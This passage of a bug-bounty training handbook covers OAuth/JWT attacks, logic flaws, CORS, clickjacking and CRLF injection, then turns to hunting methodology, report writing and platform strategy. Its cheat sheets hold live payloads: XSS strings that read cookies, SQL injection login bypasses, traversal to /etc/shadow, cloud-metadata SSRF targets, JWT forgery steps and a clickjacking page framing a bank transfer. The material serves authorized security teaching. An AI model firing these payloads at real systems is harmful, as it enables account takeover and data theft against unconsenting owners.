A researcher noticed a signup request containing a literal `"password":"not-provided"` field, and successfully logged in using that string directly — the application used a hardcoded default password for every OAuth-created account. Custom "glue code" bolted onto a standard OAuth flow is frequently where real mistakes concentrate.

### JWT Attacks

1. **`alg: none`** — submitting a token with `{"alg":"none"}` and an empty signature.
2. **Algorithm confusion (RS256 → HS256)** — forging a token via HMAC using the RSA public key as the secret, since the public key is, by definition, public.
3. **Weak/brute-forceable secret** — dictionary or brute-force attacks against a short HMAC secret using `jwt_tool` or `hashcat`.
4. **Key leaked via another vulnerability** — chaining with SSRF, XXE, or path traversal to read the signing key from a configuration file.

### Broader Broken Authentication Patterns

| Pattern | Test |
|---|---|
| Username/email enumeration | Compare login/reset responses for a known-valid versus clearly invalid email |
| Predictable/reusable reset tokens | Attempt to reuse an old reset link, or brute-force a short token |
| Session fixation | Check whether a new session ID is issued after login |
| Missing re-authentication | Check whether sensitive changes require re-entering the current password |

### Manual Testing / Burp Workflow
1. Capture the complete OAuth flow, including every redirect.
2. Test `redirect_uri` validation against the bypass table.
3. Check whether `state` is present, unique, and actually validated.
4. Decode any issued JWT and check the `alg` field and secret strength.
5. Test the login/reset flow for enumeration and confirm session-ID rotation after login.

### False Positives
Exact-match `redirect_uri` validation is not exploitable simply because the parameter exists. Minor timing differences are not sufficient evidence of username enumeration without a clearer content or status-code distinction.

### Verification
Demonstrate the full chain: the crafted malicious link, the victim's browser sending the token to attacker-controlled infrastructure, and the concrete access that token grants given its scope.

### Reporting
For token theft, show the complete chain end-to-end. For JWT forgery, show the forged token and a request that succeeds using it under an unauthorized role. For broader authentication issues, describe the concrete exploitation path a realistic attacker would follow.

### Prevention
Exact-match `redirect_uri` allowlisting, mandatory algorithm pinning on JWT verification, sufficiently long random signing secrets, session-ID rotation on privilege change, and re-authentication requirements on sensitive account actions.

### Key Takeaways
Most OAuth vulnerabilities stem from `redirect_uri` prefix/suffix validation flaws or custom glue code layered on top of the standard flow. JWT attacks target signature-enforcement gaps rather than the token format itself.

### Cheat Sheet
```
OAuth redirect_uri bypass tests:
  https://whitelisted.com.attacker.com
  https://whitelisted.com@attacker.com
JWT attacks:
  alg: none + empty signature
  RS256 → HS256 confusion
  Brute-force weak HMAC secret
```

### Exercises
1. **(Foundational)** Forge an `alg:none` JWT against a lab target using Burp's JWT extension.
2. **(Intermediate)** Test a login form for username enumeration by comparing valid versus invalid account responses.
3. **(Advanced)** Attempt an RS256-to-HS256 algorithm-confusion forgery against a lab JWT implementation.

### Practice Labs
- PortSwigger Web Security Academy: "JWT authentication bypass via unverified signature"; "JWT authentication bypass via flawed signature verification"; "OAuth account hijacking via redirect_uri"

### Review Questions
1. Why does the `example.com.attacker.com` trick bypass prefix-based `redirect_uri` validation?
2. Why does RS256-to-HS256 confusion specifically exploit the public nature of the RSA public key?
3. Why does session-ID rotation after login represent a meaningful security control?

### References
- `ticarpi/jwt_tool`
- OWASP JSON Web Token Cheat Sheet

## Chapter 16 — Business Logic Flaws and Broken Access Control

### Learning Objectives
- Distinguish application logic errors from broken access control as related but separate categories
- Test multi-step processes for skippable-step vulnerabilities
- Recognize inconsistent trust enforcement across access paths

### Definitions
An **application logic error** uses an application's legitimate, functioning capabilities in a sequence or combination the developer never intended, causing measurable harm. **Broken access control** refers to sensitive resources or functionality that are not consistently protected across every possible access path — IDOR (Chapter 8) is one specific instance within this broader category.

### Case Study — Skippable MFA Step
A three-step login flow (password → MFA code → security questions) is vulnerable if the final step's page does not independently verify that the prior step was actually completed, relying only on redirect-based flow control. Directly requesting the final step's URL can bypass both password and MFA entirely.

### Case Study — Unverified Payment Method
```
Saved card (skips verification): saved_card=1 & payment_id=1
New card (gets verified):        card_number=1234-1234-1234-1234
```
Submitting both `saved_card=1` and a fabricated `card_number` exploited the application's assumption that "has `saved_card`" implied "already verified," allowing unlimited free orders using no valid payment method at all.

### Table 16.1 — Broken Access Control Patterns

| Pattern | Description | Test |
|---|---|---|
| Obscured admin panels | Security through obscurity, not real protection | Directory brute-force and dorking still find them |
| Inconsistent trust across paths | Internal-IP requests skip authentication entirely | Chain with SSRF to reach the trusted internal path |
| Predictable trust cookies | Privilege granted by a client-supplied cookie value | Add a plausible privilege cookie (`admin=1`) even if never observed being set |
| Forced browsing | A protected page's underlying resource does not independently verify authentication | Request the resource URL directly, bypassing the login screen |
| Directory traversal | Unsanitized file parameter | `../../../../etc/shadow` style payloads |

### Discovery Process
Study the target beyond surface testing — engineering blogs, changelogs, and documentation reveal newly launched features, which are consistently the least scrutinized by other hunters. Map every multi-step or multi-path process (payments, account recovery, permission changes) and note exactly which parameter signals "this step is complete."

### Manual Testing / Burp Workflow
For each mapped process, systematically test: can a later step's URL be requested directly? Can parameters from two different valid paths be combined? Can a plausible privilege-indicating cookie or header be added?

### False Positives
An obscure URL is not evidence of security; direct access must actually be tested and confirmed protected or unprotected.

### Verification
Reproduce the bypass from a clean, unprivileged session and document the exact skipped step or combined parameter set.

### Reporting
Explain the business consequence explicitly and concretely rather than assuming the triager will infer severity — impact is rarely self-evident for findings that do not fit a named vulnerability class.

### Prevention
Every step of a multi-step process must independently verify completion of all prior steps server-side; no security decision should ever be inferred from the mere presence of a client-supplied parameter.

### Key Takeaways
Business logic flaws use entirely legitimate functionality in an unintended sequence; broken access control is inconsistent protection across access paths. Neither requires malicious injection syntax — both require careful mapping and creative, adversarial thinking.

### Cheat Sheet
```
Test matrix:
  [ ] Can I jump directly to a later step's URL?
  [ ] Can I combine parameters from two valid paths?
  [ ] Can I add a plausible privilege cookie/header?
  [ ] Is a "hidden" admin path actually protected?
  [ ] Does a file/path parameter accept traversal sequences?
```

### Exercises
1. **(Foundational)** Test a multi-step process in a lab environment for direct navigation to a later step.
2. **(Intermediate)** Attempt a directory traversal payload against a deliberately vulnerable lab endpoint.
3. **(Advanced)** Identify a checkout or payment flow with two valid code paths and test combining parameters from both.

### Practice Labs
- PortSwigger Web Security Academy: "2FA broken logic"; "High-level logic vulnerability"; "Unprotected admin functionality"; "File path traversal, simple case"

### Review Questions
1. Why does the skippable-MFA vulnerability occur even though every individual step works correctly in isolation?
2. Why is combining `saved_card=1` with a fake card number more effective than testing either field alone?
3. Why is an obscure admin URL not equivalent to a secured one?

### References
- OWASP Testing Guide — Business Logic Testing
- PayloadsAllTheThings — Business Logic Errors; Directory Traversal

## Chapter 17 — CORS Misconfiguration, Clickjacking, and Request Smuggling

### Learning Objectives
- Identify exploitable CORS misconfigurations versus safe wildcard configurations
- Build a working clickjacking proof of concept
- Recognize CRLF injection and how encoding quirks can bypass naive filters

### CORS Misconfiguration

| Misconfiguration | Mechanism |
|---|---|
| Trusted `null` origin | Any sandboxed iframe or `data:` URL request carries a `null` origin, trivially spoofable |
| Blind origin reflection | Server echoes the request's `Origin` header back as `Access-Control-Allow-Origin` without validation |
| Weak prefix/regex validation | `https://www.example.com.attacker.com` bypasses a naive "starts with" check |

A bare wildcard (`Access-Control-Allow-Origin: *`) is not itself exploitable, since CORS explicitly disallows sending credentials alongside wildcard-permitted requests — a finding here requires demonstrating credentialed, authenticated data access specifically.

**Testing:** send a request with an attacker-controlled `Origin` header and check whether the response's `Access-Control-Allow-Origin` header reflects it, combined with sensitive, authenticated response data.

### Clickjacking

```html
<style>
  #victim-site { opacity:0.00001; z-index:1; }
  #decoy { position:absolute; z-index:-1; }
</style>
<div id="decoy"><h3>Click here to claim your free prize!</h3></div>
<iframe id="victim-site" src="https://bank.com/transfer_money?recipient=attacker&amount=5000"></iframe>
```
A nearly invisible, pre-filled sensitive page is layered beneath an enticing decoy, tricking the victim into clicking a real, authenticated action while believing they are clicking something harmless. Clickjacking is frequently excluded from bug bounty scope entirely — always check program policy before investing time here.

### CRLF Injection / HTTP Response Splitting / Request Smuggling

**Case Study — Shopify Response Splitting ($500).** An unsanitized cookie-setting parameter accepted encoded CRLF sequences (`%0d%0a`), allowing an entirely fabricated second HTTP response to be injected and rendered by the browser.

**Case Study — Twitter Response Splitting via Encoding Bypass ($3,500).** Twitter blacklisted raw `%0D%0A`, but a Firefox multibyte-Unicode-stripping quirk allowed a 3-byte encoded character to be partially stripped, leaving the forbidden sequence intact and smuggling it past the filter — escalating to an injected `Location` header containing an XSS payload that stole the victim's session cookie. When a direct payload is blacklisted, consider how the browser itself may decode or normalize characters differently than the server-side filter expects.

### Manual Testing / Burp Workflow

**CORS:** send `Origin: https://attacker.com`, check the reflected `Access-Control-Allow-Origin` value.
**Clickjacking:** save an HTML file with `<iframe src="https://target.com/sensitive-page"></iframe>` and confirm rendering.
**CRLF:** submit `%0D%0A` in any header-reflected parameter; if filtered, attempt multibyte-encoding bypasses.

### False Positives
Bare wildcard CORS without demonstrated credentialed access; clickjacking against pages with no sensitive action; CRLF payloads correctly stripped server-side with no available browser-decoding bypass.

### Verification
For CORS, confirm actual authenticated data retrieval cross-origin. For clickjacking, confirm the sensitive action is genuinely framable and pre-fillable via URL parameters. For CRLF, confirm the response genuinely splits into a second, attacker-controlled response.

### Reporting
For CORS, show the crafted `Origin` header and reflected response, plus proof of authenticated data access. For clickjacking, provide the working HTML proof of concept and confirm scope eligibility first. For CRLF, show the exact encoded payload, decoded response, and downstream impact.

### Prevention
Strict origin allowlisting (never reflection) for CORS; `X-Frame-Options`/`Content-Security-Policy: frame-ancestors` for clickjacking; strict output encoding of any user input reflected into HTTP headers for CRLF.

### Key Takeaways
CORS wildcard alone is not exploitable without demonstrated credentialed access. Clickjacking requires a genuinely sensitive, pre-fillable action and in-scope status. CRLF/response-splitting can escalate through browser-specific decoding quirks that bypass server-side filters.

### Cheat Sheet
```
CORS test:      Origin: https://attacker.com → check ACAO reflection
Clickjacking:   <iframe src="https://target.com/sensitive"></iframe>
CRLF test:      %0D%0A in any header-reflected parameter
```

### Exercises
1. **(Foundational)** Test an API endpoint for CORS misconfiguration using an attacker-controlled `Origin` header.
2. **(Intermediate)** Build a working clickjacking proof-of-concept page against a lab target.
3. **(Advanced)** Test a header-reflected parameter for CRLF injection and, if filtered, attempt an encoding-based bypass.

### Practice Labs
- PortSwigger Web Security Academy: "CORS vulnerability with trusted null origin"; "Basic clickjacking with CSRF token protection"; "Clickjacking with form input data prefilled from a URL parameter"

### Review Questions
1. Why is a bare CORS wildcard generally safe, while origin reflection is not?
2. Why does clickjacking require pre-fillable URL parameters on the target action?
3. How did the Twitter CRLF bypass illustrate the value of considering browser-specific decoding behavior?

### References
- PayloadsAllTheThings — CORS Misconfiguration; Clickjacking; CRLF Injection


---

# Part IV — Methodology and Reporting

## Chapter 18 — A Complete Hunting Methodology

### Learning Objectives
- Sequence reconnaissance, mapping, prioritization, testing, verification, reporting, and retesting into one repeatable workflow
- Apply a prioritization framework that consistently surfaces higher-impact findings
- Build a monitoring practice that surfaces new attack surface automatically

### Theory

```
┌──────────┐   ┌───────────┐   ┌──────────────┐   ┌─────────┐
│  RECON   │ → │  MAPPING  │ → │PRIORITIZATION│ → │ TESTING │
└──────────┘   └───────────┘   └──────────────┘   └─────────┘
      ▲                                                  │
      │                                                  ▼
┌──────────┐   ┌───────────┐   ┌──────────────┐   ┌─────────┐
│ RETESTING│ ← │ REPORTING │ ← │ VERIFICATION │ ← │ FINDING  │
└──────────┘   └───────────┘   └──────────────┘   └─────────┘
```

**Mapping** goes beyond a subdomain list — actually browsing the application as a regular user builds the mental model needed to recognize which features process payments, handle personal data, manage authentication, or let users interact with each other's data.

**Prioritization** is where experienced hunters diverge most from beginners:
- Follow the sensitive data — prioritize features handling payments, PII, or authentication.
- Prioritize newly launched features, which have had the least scrutiny from other hunters.
- Match vulnerability class to fingerprinted tech stack (Jinja2 → SSTI, GraphQL → IDOR, XML uploads → XXE).
- Treat reconnaissance as continuous, not a one-time pass.

**Testing** applies Part III systematically rather than randomly:

| Feature signal | Prioritized test |
|---|---|
| References an ID/file/resource | IDOR |
| Accepts a URL | SSRF / Open Redirect |
| Renders input anywhere, immediately or later | XSS / SSTI |
| Limited/one-time numeric action | Race condition |
| State-changing via GET, or lacks visible CSRF protection | CSRF |

**Verification** requires re-confirming a finding from a clean session and ruling out the false-positive patterns documented in each Chapter of Part III before ever writing a report.

**Retesting and continuous monitoring:**
```bash
30 21 * * * ./recon.sh target.com    # scheduled daily recon via cron
git diff SCAN_YESTERDAY SCAN_TODAY   # surface newly deployed attack surface
```

### Common Mistakes
Testing whichever vulnerability class is personally most enjoyable regardless of what the feature actually suggests; treating recon as a one-time task; grinding harder on a stalled target rather than stepping back.

### Professional Tips
Long dry spells are structurally normal, not evidence of failure. When stuck: take an actual break, learn a new technique rather than repeating the same tests, diversify across two or three targets, and shift attention from "which named vulnerability can I find" to "what's genuinely strange here."

### Key Takeaways
A repeatable methodology — recon, map, prioritize, test, verify, report, retest — consistently outperforms unstructured testing. Prioritization by sensitive data, feature novelty, and tech-stack fit is the primary lever separating consistent hunters from occasional ones.

### Cheat Sheet
```
Prioritization filter, in order:
  1. Sensitive data features (payments, PII, auth)
  2. Newly launched features
  3. Tech-stack-matched vuln classes
Automation: cron + git diff on daily recon scans
```

### Exercises
1. **(Foundational)** Write a complete methodology document for a real target: mapped attack surface, prioritization reasoning, and per-feature testing checklist.
2. **(Intermediate)** Set up one piece of scheduled recon automation with output diffing.
3. **(Advanced)** Design a personal dry-spell protocol specifying exactly what you will do after a defined period without a finding.

### Practice Labs
Revisit 2–3 previously solved labs and consciously apply the tech-stack-driven testing filter before selecting a payload.

### Review Questions
1. Why does following sensitive data during prioritization tend to produce higher-impact findings?
2. Why are newly launched features disproportionately valuable to prioritize?
3. Why is scheduled, diffed recon more effective than a single one-time pass?

### My Custom Methodology
*(Document your personal prioritization logic, testing sequence, and automation setup here as it matures.)*

---

## Chapter 19 — Writing Reports That Get Taken Seriously

### Learning Objectives
- Structure a complete, professional vulnerability report
- Calibrate severity ratings to a program's actual business priorities
- Communicate impact in a way that survives triage

### The Eight-Part Report Structure

**1. Descriptive title.** State the vulnerability type, exact location, and consequence in one sentence.
```
Weak:   "IDOR on a Critical Endpoint"
Strong: "IDOR on https://example.com/change_password Leads to Account Takeover for All Users"
```

**2. Clear summary.** State the mechanism precisely:
> "The `https://example.com/change_password` endpoint takes two POST body parameters: `user_id` and `new_password`. This endpoint does not validate the `user_id` parameter, allowing any user to change anyone else's password by manipulating it."

**3. Honest severity assessment.**

| Severity | Meaning | Example |
|---|---|---|
| Low | Minimal potential damage | Open redirect usable only for phishing |
| Medium | Moderate impact, or hard-to-exploit high severity | CSRF on password change |
| High | Impacts many users, serious consequences | Open redirect enabling OAuth token theft |
| Critical | Impacts a majority of users or core infrastructure | SQLi leading to RCE on production |

Calibrate severity to what the specific organization values — a birth-date leak may be trivial on a platform where it is already public, but significant where confidentiality is expected. Use the platform's own CVSS-based calculator when uncertain.

**4. Assume-nothing reproduction steps.** Specify every setup prerequisite (including the need for two test accounts), exact UI locations, and exact parameter names — never assume the reader shares your context.

**5. Proof of concept.** An HTML file with an embedded CSRF payload, a crafted XML file for XXE, or a screen-recorded video for complex multi-step exploits — anything that saves the security team from rebuilding the attack themselves.

**6. Impact and attack scenario**, distinct from the severity rating — describe concretely what the consequences would actually look like, grounded in what was demonstrated, never speculative.

**7. Suggested mitigation**, offered only when the root cause is genuinely understood — an internal team typically has far more context on their own codebase.

**8. Final validation.** Re-walk the reproduction steps exactly as written, and re-test any PoC files, before submitting.

### Common Mistakes
Vague titles that convey neither location nor severity; reproduction steps that silently assume shared context; overstated impact built on speculation rather than demonstrated fact; skipping the final validation pass.

### Professional Tips
Write for a reader with zero prior context — they may be a developer rather than a dedicated security engineer, especially on newer or smaller programs, and they have other responsibilities competing for their attention.

### Key Takeaways
A technically valid finding with a poorly written report is functionally equivalent to no finding at all. The eight-part structure — title, summary, severity, reproduction steps, proof of concept, impact, mitigation, validation — should become a fixed personal habit.

### Cheat Sheet
```
Title:      [Vuln type] on [specific endpoint] leads to [concrete consequence]
Severity:   Low / Medium / High / Critical, calibrated to the org's priorities
Repro:      assume-nothing, numbered, includes ALL setup prerequisites
Impact:     concrete worst-case, no hypotheticals
Validate:   re-walk your own steps before submitting
```

### Exercises
1. **(Foundational)** Rewrite a past finding using the complete eight-part structure.
2. **(Intermediate)** Write a full report, including a PoC file, for a lab-based finding.
3. **(Advanced)** Have a third party read a completed report cold and note anywhere your assumed context caused confusion.

### Practice Labs
Not lab-specific — write a full report for any previously solved lab as practice.

### Review Questions
1. Why is a specific, consequence-naming title stronger than a generic vulnerability-class title?
2. Why should severity assessment be calibrated per organization rather than applied as a fixed universal rule?
3. Why is the impact/attack-scenario section distinct from the severity rating?

### My Reporting Templates
*(Maintain your personal, refined reporting template here as you accumulate real submission experience.)*


---

# Part V — Real-World Hunting

## Chapter 20 — Navigating Bug Bounty Platforms

### Learning Objectives
- Compare platform-managed and independently hosted programs
- Read asset and vulnerability scope correctly
- Build a strategic path from public programs toward private invitations

### Platform Landscape

| Platform | Notes |
|---|---|
| HackerOne | Largest, broad program mix, public reputation system |
| Bugcrowd | Similar scale, own Vulnerability Rating Taxonomy |
| Intigriti | Strong presence in Europe |
| YesWeHack | Strong presence in Europe and Asia |
| Synack | Vetted, invite-only — a longer-term goal, not a starting point |
| Independently hosted | Companies (Google, Facebook, Apple) manage programs directly |

**Platform-managed programs** provide transparency (disclosed reports, published metrics), remove payment/logistics overhead, and offer reputation-based access to private invitations and third-party dispute resolution — at the cost of triagers occasionally lacking deep product context, and heavier competition on public programs due to platform visibility.

### Reading Scope Correctly

```
In-scope assets:      a.example.com, b.example.com, users.example.com
Out-of-scope assets:  dev.example.com, test.example.com
```
Testing an asset outside the defined scope is not merely a policy violation — it is unauthorized access. Vulnerability-scope exclusions commonly include self-XSS, clickjacking, missing security-header best practices, denial-of-service, and unverified library/scanner findings — several of these exclusions hinge specifically on the absence of demonstrated exploitability.

### Vulnerability Disclosure Programs (VDPs)
Unpaid VDPs earn only reputation, not money, and are consequently ignored by most experienced hunters — making them significantly less competitive and a genuinely strong starting point for building report-writing experience and platform reputation at low risk.

### The Path to Private Invitations
1. Submit valid, high-impact bugs to public programs to accumulate reputation.
2. Never submit low-effort or speculative reports — invalid submissions actively reduce reputation.
3. Some platforms grant invitations for completing tutorials or CTF-style challenges.
4. Maintain professionalism in every interaction; rudeness can result in bans that follow a public track record.

### Choosing the Right Program
Favor large asset scope (more overlooked applications, diluted competition), large vulnerability scope (more opportunities to apply current strengths), fast response times (faster feedback while still learning), and a reputation — visible through disclosed reports — for treating researchers respectfully.

### Key Takeaways
Respect both asset and vulnerability scope without exception. Start on unpaid, large-scope, fast-responding public programs to build reputation before pursuing private invitations.

### Cheat Sheet
```
Beginner program-picking priorities:
  1. Large asset scope
  2. Large vulnerability scope
  3. Fast response time
  4. Good researcher-relationship reputation
```

### Exercises
1. **(Foundational)** Read the full policy pages of three different programs and note their scope differences.
2. **(Intermediate)** Identify one VDP and one paid program matching the beginner-priority criteria.
3. **(Advanced)** Write a personal plan describing which program to hunt on first and why.

### Practice Labs
Not applicable — this chapter concerns platform strategy rather than technical exercises.

### Review Questions
1. Why might "without proof of exploitability" be the deciding factor behind several common scope exclusions?
2. Why is starting on unpaid VDPs a legitimate beginner strategy?
3. Why does a large asset scope reduce competition more effectively than a large vulnerability scope alone?

---

## Chapter 21 — Finding Your First Valid Bug

### Learning Objectives
- Apply tech-stack fingerprinting to prioritize which vulnerability classes are plausible on a given target
- Use the polyglot-payload technique for efficient manual probing
- Build a realistic daily and weekly hunting routine

### Core Philosophy
Approach every target as though no one has tested it before, rather than assuming it has already been picked clean; if nothing surfaces, move to a different target rather than abandoning the practice altogether.

### Step 1 — Fingerprint the Stack

| Stack signal | Prioritized test |
|---|---|
| AngularJS detected | `{{7*7}}` for CSTI |
| ASP.NET with XSS protection enabled | Deprioritize XSS, test other classes first |
| Rails detected (integer IDs in URLs) | Prioritize IDOR |
| JSON/XML API | Check for over-returned data (information disclosure) |
| XML/.docx/.xlsx uploads | Prioritize XXE |
| Custom OAuth implementation | Prioritize redirect_uri/state testing |

### Step 2 — Functionality Mapping (Three Approaches)
- **Vulnerability-marker-driven** — browse for known bug-indicative patterns (webhook fields, impersonation features, file uploads) and stop to test immediately upon finding one.
- **Goal-driven** — decide on a single target vulnerability class in advance and ignore everything else until it is found or the target is exhausted.
- **Checklist-driven** — follow a comprehensive testing checklist to avoid oversight, at the cost of monotony.

### Step 3 — The Polyglot Probe
```
<s>000'")};--//
```
A single payload probing HTML, JavaScript, and SQL contexts simultaneously; the `<s>` tag is harmless but visually obvious (strikethrough) if rendered unsanitized, and commonly survives naive sanitization attempts. Template-specific probes (`{{8*8}}[[5*5]]` for AngularJS) supplement this for template-injection candidates.

### Table 21.1 — Vulnerability Indicator Quick Reference

| Signal observed | Test for |
|---|---|
| State-changing request without validated token/referer | CSRF |
| Manipulable ID parameter | IDOR |
| Repeatable request across two accounts | Application logic flaws |
| Any XML-accepting request | XXE |
| Content that should be private but isn't | Information disclosure |
| Redirect-related URL parameter | Open redirect |
| URL parameter echoed in the response | CRLF, XSS, open redirect |
| Single quote/bracket/semicolon changes behavior | SQLi |
| File upload or image manipulation | RCE |
| Time-of-check/time-of-use behavior | Race conditions |
| Webhook/external-integration URL field | SSRF |
| Disclosed version info | Known CVEs |

### Step 4 — When Stuck
Revisit directory brute-forcing output for unvisited paths, check Burp's grayed-out unvisited links, and reread and retest previously disclosed reports after any visible application change — a deployed fix means new code, and new code can contain new bugs.

### Daily and Weekly Workflow

**Daily:** review recon output for changes → one to two hours of focused testing on one prioritized feature → log every result, including negative ones.
**Weekly:** retest previously disclosed reports after any app changes → rotate targets if the primary one has gone quiet → review logged "weird behavior" notes with fresh eyes.

### Where Beginners Realistically Succeed
IDOR, business logic flaws, and open redirect/CSRF chains are the most realistic first-bug targets — not remote code execution or SQL injection, which typically require longer pattern-recognition development.

### Key Takeaways
Fingerprinting the tech stack should directly shape testing priorities. The polyglot payload is an efficient first probe before investing in context-specific crafting. IDOR and logic flaws remain the most realistic first-bug categories for a beginner.

### Cheat Sheet
```
Universal probe payload:  <s>000'")};--//
Template probe:           {{8*8}}[[5*5]]  (AngularJS)
When stuck:
  → revisit brute-force output for unvisited paths
  → check Burp's grayed-out unvisited links
  → reread and retest a disclosed report after any app change
```

### Exercises
1. **(Foundational)** Fingerprint a real target's tech stack and write down testing priorities based on it.
2. **(Intermediate)** Practice the polyglot payload technique across five different input fields on a test application.
3. **(Advanced)** Read one disclosed report on the target program's public activity feed and retest that functionality directly.

### Practice Labs
Revisit solved labs from Part III with a conscious tech-stack-fingerprinting mindset rather than solving new ones.

### Review Questions
1. Why does detecting a Rails backend raise IDOR to a testing priority?
2. Why is retesting a previously fixed, disclosed report a legitimate strategy rather than wasted effort?
3. Why should a beginner's realistic first-bug target be IDOR or a logic flaw rather than RCE or SQLi?

---

## Chapter 22 — Sustaining a Bug Bounty Career

### Learning Objectives
- Respond appropriately to every report state a program can assign
- Handle disagreements over validity, severity, or payout professionally
- Scale beyond manual testing through automation and long-term reputation building

### Table 22.1 — Report States and Appropriate Responses

| State | Meaning | Action |
|---|---|---|
| Need More Information | Reproduction failed with the given details | Revise promptly with the specific missing information |
| Informative | Real issue, insufficient impact to warrant a fix | Log it; look for future chaining opportunities |
| Duplicate | Already reported by another researcher | Escalate or chain into a distinct, separately reportable issue |
| Triaged | Validated, fix and bounty likely forthcoming | Stay responsive to follow-up questions |
| N/A | Not a valid security issue | Move on |
| Resolved | Fixed (and paid, on paying programs) | Offer to help with retesting if requested |

### Handling Conflict
First verify the original report for mistakes — an incorrect URL or missing detail in the proof of concept frequently explains an unwarranted informative/N/A classification. If no error exists but disagreement remains, provide a calm, evidence-based follow-up explaining the reasoning, and request mediation if unresolved. Severity disagreements are usually best resolved by explaining concrete attack scenarios, since impact is rarely obvious for findings outside a well-known named vulnerability class. Always respect the organization's final decision once a case has been made.

### Building Long-Term Partnerships
Submitting only validated reports, learning each organization's expected communication style, and remaining engaged through to resolution — including accepting paid retest requests — compounds into faster responses, larger bounties, and occasionally direct employment opportunities.

### Recurring Failure Patterns Worth Revisiting
- Targeting programs with poor response times or low average bounties, identifiable through disclosed-report statistics.
- Abandoning a program after only hours or days rather than digging deep or searching wide into lesser-known assets.
- Skipping reconnaissance and jumping directly into testing on heavily contested public assets.
- Relying exclusively on scanners and obvious bug types, which are the most heavily contested by other researchers.
- Never building the reputation required to access private, less-crowded programs.

### Scaling Through Automation
Manual testing has a hard ceiling. Automating the highest-value, most repetitive parts of the reconnaissance workflow — subdomain enumeration, port scanning, and visual recon — allows continuous, scheduled discovery of new attack surface the moment it appears, rather than only during deliberate sessions. A background in scripting is a genuine long-term advantage here, whether through simple diffing scripts or more advanced custom triage tooling.

### Key Takeaways
Professional handling of every report state and every disagreement compounds into long-term reputation and access. Scaling beyond an individual's manual-testing throughput, through automation and custom tooling, is what separates a sustainable practice from a capped one.

### Cheat Sheet
```
Report states → action:
  Need More Info  → revise with missing details, promptly
  Informative     → log it, look for chaining opportunities later
  Duplicate       → try escalating/chaining into a distinct bug
  Triaged         → stay responsive to follow-ups
  N/A             → move on
  Resolved        → celebrate, offer to help retest
```

### Exercises
1. **(Foundational)** Draft a professional response template for each report state.
2. **(Intermediate)** Sketch a script that diffs two days of recon output and flags new subdomains or endpoints.
3. **(Advanced)** Self-audit your own hunting history against the five recurring failure patterns above.

### Practice Labs
Not applicable — this chapter concerns career practice rather than technical exercises.

### Review Questions
1. Why might a report marked "duplicate" still be worth escalating rather than abandoning?
2. Why does explaining a concrete attack scenario often resolve a severity disagreement more effectively than simply asserting seriousness?
3. Why do private programs disproportionately account for successful hunters' best findings?

### My Future Improvements
*(Record specific automation projects, skill gaps, and long-term goals here as your practice matures.)*


---

# Appendices

## Appendix A — HTTP Status Codes

| Code | Meaning | Security Relevance |
|---|---|---|
| 200 | OK | Always verify body content, not just the code |
| 201 | Created | Confirm the created resource's ownership is correctly scoped |
| 204 | No Content | Common on successful state-changing actions — check for missing auth checks |
| 301/302 | Redirect | Open redirect and OAuth `redirect_uri` testing surface |
| 400 | Bad Request | May leak internal validation logic in the body |
| 401 | Unauthorized | Confirm it is returned consistently across all methods and routes |
| 403 | Forbidden | Resource exists — investigate bypasses (case, extra slashes, alternate methods) |
| 404 | Not Found | Resource does not exist — but confirm consistent behavior to avoid enumeration |
| 429 | Too Many Requests | Rate limiting present — test for race-condition bypass |
| 500 | Internal Server Error | Frequently leaks stack traces and version information |

## Appendix B — Common HTTP Headers

| Header | Purpose |
|---|---|
| `Authorization` | Bearer tokens, Basic auth credentials |
| `Cookie` / `Set-Cookie` | Session identifiers; check `HttpOnly`, `Secure`, `SameSite` flags |
| `Origin` / `Referer` | CORS and CSRF validation targets |
| `Access-Control-Allow-Origin` | CORS policy — test for reflection/null-origin misconfiguration |
| `Content-Type` | Determines body parsing; switching this can bypass CSRF preflight |
| `X-Forwarded-For` | Often trusted for IP-based logic — spoofable |
| `X-Content-Type-Options` | `nosniff` prevents MIME-sniffing |
| `Content-Security-Policy` | Mitigates XSS impact |
| `Location` | Redirect target — open redirect and response-splitting surface |

## Appendix C — Recommended Burp Suite Extensions

Autorize · Logger++ · Param Miner · Turbo Intruder · JSON Web Tokens · Auto Repeater · AuthMatrix

## Appendix D — Essential Linux Commands for Recon

```bash
curl -s -o /dev/null -w "%{http_code}" URL      # status code only
dig +short target.com                            # DNS resolution
whois target.com                                 # registration info
nslookup target.com
nc -zv target.com 80 443                         # port connectivity check
```

## Appendix E — Bash Cheat Sheet for Hunting Workflows

```bash
# Background multiple curl requests (simple race-condition test)
curl (request) & curl (request) & curl (request) &

# Loop over a wordlist
while read -r line; do curl -s "https://target.com/$line"; done < wordlist.txt

# Cron entry for scheduled recon
30 21 * * * /home/user/recon.sh target.com >> /home/user/logs/recon.log 2>&1
```

## Appendix F — Regex Quick Reference for Log/Recon Analysis

```
[a-zA-Z0-9-]+\.target\.com         # subdomain matching
(api|admin|internal|staging)\.     # interesting subdomain prefixes
[?&](url|redirect|next|dest)=      # redirect/SSRF-candidate parameters
[a-zA-Z0-9+/]{20,}={0,2}           # base64-looking values worth decoding
```

## Appendix G — General Payload Cheat Sheet

```
Polyglot probe:     <s>000'")};--//
CRLF:               %0D%0A
Path traversal:     ../../../../etc/passwd
Template (Jinja2):  {{7*7}}
Template (AngularJS): {{8*8}}[[5*5]]
```

## Appendix H — XSS Cheat Sheet

```
Canary:            zzXSStestzz123
HTML context:      "><script>alert(document.domain)</script>
Attribute context: " onfocus=alert(document.cookie) autofocus "
JS-string context: ';alert(document.cookie);'
```

## Appendix I — SQL Injection Cheat Sheet

```
Test:            '
Auth bypass:     ' OR 1='1
Comment rest:    ' OR 1='1'--
Boolean-blind:   ' AND 1=1--  vs  ' AND 1=2--
Time-blind:      ' AND sleep(5)='0
```

## Appendix J — SSRF Cheat Sheet

```
Params to check:   url=, path=, dest=, image=, webhook=, callback=
AWS metadata:      169.254.169.254/latest/meta-data/
GCP metadata:      metadata.google.internal
Internal ranges:   127.0.0.1, 10.x.x.x, 192.168.x.x
```

## Appendix K — JWT Cheat Sheet

```
Structure:   header.payload.signature (base64url each segment)
alg:none attack:   set alg to "none", empty signature
Algorithm confusion:  sign HS256 token using the RSA public key as secret
Weak secret:   brute-force with jwt_tool / hashcat
```

## Appendix L — Useful Wordlists

- SecLists (`danielmiessler/SecLists`) — directories, subdomains, parameters, usernames
- Assetnote wordlists — technology-specific fuzzing lists
- PayloadsAllTheThings — payload sets organized by vulnerability class

## Appendix M — Bug Bounty Platforms

HackerOne · Bugcrowd · Intigriti · YesWeHack · Synack · Open Bug Bounty

## Appendix N — Tool Installation Quick Reference

```bash
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
